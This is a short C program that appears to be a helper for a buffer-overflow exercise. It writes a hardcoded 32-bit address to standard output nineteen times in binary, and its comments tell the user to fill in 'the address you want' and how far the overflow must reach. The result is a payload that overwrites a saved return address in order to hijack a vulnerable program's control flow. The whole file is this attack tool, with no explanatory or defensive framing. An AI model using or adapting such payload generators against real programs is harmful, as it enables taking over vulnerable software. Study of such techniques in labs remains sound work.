#include <stdio.h>
#include <unistd.h>



int main(int argc, char* argv[]){
	int i;
	FILE *const out = fdopen(fileno(stdout), "wb");
	int address = 0x08048934; //put in the address you want to right here
	int count = 18; //how far do you have to write? (remember how many bytes ints are)
	for(i = 0; i <= count; i++)
		write(fileno(out), &address, 4);
	
}
